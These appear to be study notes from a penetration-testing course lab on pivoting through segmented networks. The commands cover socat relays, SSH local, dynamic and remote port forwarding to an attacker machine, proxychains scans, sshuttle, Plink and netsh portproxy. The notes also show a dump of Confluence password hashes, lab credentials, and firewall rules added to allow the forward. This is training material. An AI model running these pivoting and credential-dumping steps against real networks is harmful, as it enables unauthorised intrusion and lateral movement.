# Module 18: Port Redirection and SSH Tunneling

Why Port Redirection and Tunneling?

Most networks aren't _flat_, or at least shouldn't be. Port Redirection and Tunneling are important because we will likely run into network with segmentation via subnets, firewalls, etc.

### Port Forwarding with Linux Tools

#### A Simple Port Forwarding Scenario

Context for following sections' follow-along labs. Nothing to note.

#### Setting Up the Lab Environment

More context, at this point we've gained access to a Confluence server and identified an internal subnet with plaintext credentials to a postgres database.

#### Port Forwarding with Socat

We'll be setting up a listening port on the Confluence server to listen on port 2345 on the WAN interface, forwarding all traffic to port 5432 of the postgres server using **socat**.

Starting a verbose Socat process (`-ddd`), listening on TCP port 2345 (`TCP-LISTEN:2345`), forking into a new subprocess when it receives a connection instead of dying after a single connection (`,fork`), then forwarding all traffic it receives to TCP port 5432 on the postgres server (`TCP:10.4.50.215:5432`).

{% code overflow="wrap" lineNumbers="true" %}
```bash
confluence@confluence01:/opt/atlassian/confluence/bin$ socat -ddd TCP-LISTEN:2345,fork TCP:10.4.50.215:5432
```
{% endcode %}

Connecting through the Confluence server to the postgres server with the credentials found earlier:

```bash
kali@kali:~$ psql -h 192.168.50.63 -p 2345 -U postgres

# Now that we're connected, list the databases
postgres=# \l
# Connect to the database
postgres=# \c confluence
# Grab everything from the cwd_user table which contains the username and password hashes for all Confluence users
postgres=# select * from cwd_user;
```

The hashcat mode number for _Atlassian (PBKDF2-HMAC-SHA1)_ hashes is _12001_.

### SSH Tunneling

#### SSH Local Port Forwarding

Connected to the internal server, time for a quick scan to see if SMB is listening via lolbins:

{% code overflow="wrap" lineNumbers="true" %}
```bash
database_admin@pgdatabase01:~$ for i in $(seq 1 254); do nc -zv -w 1 172.16.50.$i 445; done
```
{% endcode %}

Now that we've found a device with SMB open, time to setup local SSH port forwarding to allow us to interact directly with it from our Kali box rather than moving data one device at a time. This will listen on all interfaces via port 4455, forwarding to 172.16.50.217 port 445.

{% code overflow="wrap" lineNumbers="true" %}
```bash
# On the Confluence server, we'll connect to the postgres server, setting up a local port forward
confluence@confluence01:/opt/atlassian/confluence/bin$ ssh -N -L 0.0.0.0:4455:172.16.50.217:445 database_admin@10.4.50.215
```
{% endcode %}

#### SSH Dynamic Port Forwarding

Setting up a dynamic port forward:

```bash
confluence@confluence01:/opt/atlassian/confluence/bin$ ssh -N -D 0.0.0.0:9999
```

With that listening, we need to be able to communicate via our SOCKS proxy. In this case we'll use _Proxychains_. Proxychains uses a configuration file for almost everything, stored by default at **/etc/proxychains4.conf**. Proxies are typically found at the end of the file and can be replaced with a single line defining the proxy type, IP address, and port of the SOCKS proxy we have running on the Confluence server.

```bash
kali@kali:~$ tail -5 /etc/proxychains4.conf
[ProxyList]
# add proxy here ...
# meanwhile
# defaults set to "tor"
socks5 192.168.50.63 9999
```

With that configured, let's use proxychains to communicate through our SOCKS proxy port:

{% code overflow="wrap" lineNumbers="true" %}
```bash
kali@kali:~$ proxychains smbclient -L //172.16.50.217/ -U hr_admin --password=Welcome1234
```
{% endcode %}

Additional examples of using proxychains to now port scan that internal network:

```bash
kali@kali:~$ proxychains nmap -vvv -sT --top-ports=20 -Pn 172.16.50.217
```

{% hint style="info" %}
Proxychains is by default, configured with very high time-out values. Lowering the _**tcp\_read\_time\_out**_ and _**tcp\_connect\_time\_out**_ values in the Proxychains configuration file will force time-outs on non-responsive connections more quickly, dramatically speeding up port-scanning times.

\
Upon asking an OffSec Staff member what a reasonable timeout would be, I was told around 500 should be fine.
{% endhint %}

#### SSH Remote Port Forwarding

<pre class="language-bash" data-overflow="wrap" data-line-numbers><code class="lang-bash"><strong># Starting the SSH server on our Kali box
</strong><strong>kali@kali:~$ sudo systemctl start ssh
</strong>
# SSHing to our Kali box, setting up the remote port forward.
confluence@confluence:/opt/atlassian/confluence/bin$ python3 -c 'import pty;pty.spawn("/bin/bash")'
# -N for no executing remote commands, -R for the remote forward
confluence@confluence:/opt/atlassian/confluence/bin$ ssh -N -R 127.0.0.1:2345:10.4.50.215:5432 kali@192.168.118.4

# Back on kali, we can confirm our remote port forward is listening
kali@kali:~$ ss -ntplu
Netid State  Recv-Q Send-Q Local Address:Port Peer Address:PortProcess
tcp   LISTEN 0      128        127.0.0.1:2345      0.0.0.0:*
tcp   LISTEN 0      128          0.0.0.0:22        0.0.0.0:*
tcp   LISTEN 0      128             [::]:22           [::]:*

# Now we can probe port 2345 on our loopback interface as though we're probin the PostgreSQL port on PGDATABASE01 directly.
kali@kali:~$ psql -h 127.0.0.1 -p 2345 -U postgres
postgres=# \l
</code></pre>

#### SSH Remote Dynamic Port Forwarding

{% code overflow="wrap" lineNumbers="true" %}
```bash
# Using the same -R option as before, we setup the single port we want to create a remoete dynamic port forward via.
confluence@confluence01:/opt/atlassian/confluence/bin$ ssh -N -R 9998 kali@192.168.118.4

# Back on Kali, confirm this was setup
kali@kali:~$ ss -plunt
Netid State   Recv-Q  Send-Q   Local Address:Port   Peer Address:Port Process
tcp   LISTEN  0       128          127.0.0.1:9998        0.0.0.0:*     users:(("sshd",pid=939038,fd=9))
tcp   LISTEN  0       128            0.0.0.0:22          0.0.0.0:*     users:(("sshd",pid=181432,fd=3))
tcp   LISTEN  0       128              [::1]:9998           [::]:*     users:(("sshd",pid=939038,fd=7))
tcp   LISTEN  0       128               [::]:22             [::]:*     users:(("sshd",pid=181432,fd=4))

# Updating our proxychains configuration.
kali@kali:~$ tail -5 /etc/proxychains4.conf
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
socks5 127.0.0.1 9998

# Using proxychains to run nmap through our remote dynamic port forward
kali@kali:~$ poxychains nmap -vvv -sT --top-ports=20 -Pn -n 10.4.50.64
```
{% endcode %}

#### Using sshuttle

**sshuttle** allows us to treat SSH like a VPN by setting up local routes that force traffic through the SSH tunnel. It **requires** root privileges on the SSH client and Pyton3 on the SSH server.

{% code overflow="wrap" lineNumbers="true" %}
```bash
# Setting up a port forward from the confluence server to the PGDATABASE01 server
confluence@confluence01:/opt/atlassian/confluence/bin$ socat TCP-LISTEN:2222,fork TCP:10.4.50.215:22

# Using sshuttle to tunnel through this connection to the subnets 10.4.50.0/24 and 172.16.50.0/24
kali@kali:~$ sshuttle -r database_admin@192.168.50.63:2222 10.4.50.0/24 172.16.50.0/24

# No wany requests to hosts in the two subnets specified will be routed through the SSH connection.
kali@kali:~$ smbclient -L //172.16.50.217/ -U hr_admin --password=Welcome1234

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        scripts         Disk
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 172.16.50.217 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```
{% endcode %}

### Port Forwarding with Windows Tools

#### ssh.exe

If SSH is on Windows and is above version 7.6 we can setup the port forward.

Looking for SSH

```batch
C:\Users\rdp_admin> where ssh
C:\Windows\System32\OpenSSH\ssh.exe

C:\Users\rdp_admin> ssh.exe -V
OpenSSH_for_Windows_8.1p1, LibreSSL 3.0.2
```

#### Plink

_Plink_ is the command-line-only counterpart to _PuTTY_. Plink does **not** have the ability to setup remote dynamic port forwarding.

If we have Plink, we **can** setup a remote port forward.

{% code overflow="wrap" lineNumbers="true" %}
```batch
C:\Windows\System32\inetsrv> C:\Windows\Temp\plink.exe -ssh -l kali -pw <YOUR PASSWORD HERE> -R 127.0.0.1:9833:127.0.0.1:3389 your.kali.ip.here
```
{% endcode %}

#### Netsh

Using netsh, we can setup a port forward with the _portproxy subcontext_ with the _interface_ context. Netsh requires administrative privileges to created a port forward on Windows.

{% code overflow="wrap" lineNumbers="true" %}
```batch
: Setting up the portproxy rule (v4tov4)
C:\Windows\System32> netsh interface portproxy add v4tov4 listenport=2222 listenaddress=192.168.50.64 connectport=22 connectaddress=10.4.50.215

: Confirm the port is listening
C:\Windows\system32>netstat -anp TCP | find "2222"
  TCP    192.168.50.64:2222     0.0.0.0:0              LISTENING
  
: Confirm the port forward is stored
C:\Windows\system32> netsh interface portproxy show all

Listen on ipv4:             Connect to ipv4:

Address         Port        Address         Port
--------------- ----------  --------------- ----------
192.168.50.64   2222        10.4.50.215     22

: We still need port 2222 to be allowed through the firewall though.
C:\Windows\system32> netsh advfirewall firewall add rule name="port_forward_ssh_2222" protocol=TCP dir=in localip=192.168.50.64 localport=2222 action=allow
Ok.

: Cleaning up by deleting the rule made now that we're done.
C:\Users\Administrator>netsh advfirewall firewall delete rule name="port_forward_ssh_2222"

Deleted 1 rule(s).
Ok.

: Cleaning up by deleting the port forward we created.
C:\Windows\Administrator> netsh interface portproxy del v4tov4 listenport=2222 listenaddress=192.168.50.64
```
{% endcode %}
